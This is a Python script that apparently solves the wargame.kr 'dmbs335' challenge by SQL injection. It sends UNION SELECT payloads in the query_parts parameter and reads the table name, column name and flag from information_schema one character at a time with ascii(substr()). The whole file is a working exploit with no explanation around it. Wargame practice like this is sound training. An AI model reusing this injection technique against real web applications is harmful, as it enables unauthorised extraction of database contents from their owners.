from requests import *
s=session()
def table(leng):
    result=''
    for i in range(1,leng+1):
        url=f'http://wargame.kr:8080/dmbs335/?search_cols=&keyword=&operator=or&query_parts=idx like(0) union select 1,2,3,ascii(substr(max(table_name),{i},1)) from information_schema.tables where table_schema=database()#'
        response=get(url=url)
        response=response.text.split('3</td><td>')
        response=response[1].split('</td></tr>')
        response=response[0]
        result+=chr(int(response))
    print('테이블 :',result)

def column(leng):
    result=''
    for i in range(1,leng+1):
        url=f'http://wargame.kr:8080/dmbs335/?search_cols=&keyword=&operator=or&query_parts=idx%20like(0)%20union%20select%201,2,3,ascii(substr(column_name,{i},1))%20from%20information_schema.columns%20where%20table_name=\'Th1s_1s_Flag_tbl\'#'
        response=get(url=url)
        response=response.text.split('3</td><td>')
        response=response[1].split('</td></tr>')
        response=response[0]
        result+=chr(int(response))
    print('속성 :',result)

def flag(leng):
    result=''
    for i in range(1,leng+1):
        url=f'http://wargame.kr:8080/dmbs335/?search_cols=&keyword=&operator=or&query_parts=idx%20like(0)%20union%20select%201,2,3,ascii(substr(f1ag,{i},1)) from Th1s_1s_Flag_tbl#'
        response=get(url=url)
        response=response.text.split('3</td><td>')
        response=response[1].split('</td></tr>')
        response=response[0]
        result+=chr(int(response))
    print('flag :',result)

url=f'http://wargame.kr:8080/dmbs335/?search_cols=&keyword=&operator=or&query_parts=idx like(0) union select 1,2,3,length(max(table_name)) from information_schema.tables where table_schema=database()#'
response=get(url=url)
response=response.text.split('3</td><td>')
response=response[1].split('</td></tr>')
response=response[0]
print('1번째 테이블 길이:',response)
table(int(response))

url=f'http://wargame.kr:8080/dmbs335/?search_cols=&keyword=&operator=or&query_parts=idx%20like(0)%20union%20select%201,2,3,length(column_name)%20from%20information_schema.columns%20where%20table_name=\'Th1s_1s_Flag_tbl\'#'
response=get(url=url)
response=response.text.split('3</td><td>')
response=response[1].split('</td></tr>')
response=response[0]
print('1번째 속성 길이:',response)
column(int(response))

url=f'http://wargame.kr:8080/dmbs335/?search_cols=&keyword=&operator=or&query_parts=idx%20like(0)%20union%20select%201,2,3,length(f1ag) from Th1s_1s_Flag_tbl#'
response=get(url=url)
response=response.text.split('3</td><td>')
response=response[1].split('</td></tr>')
response=response[0]
print('1번째 flag 길이:',response)
flag(int(response))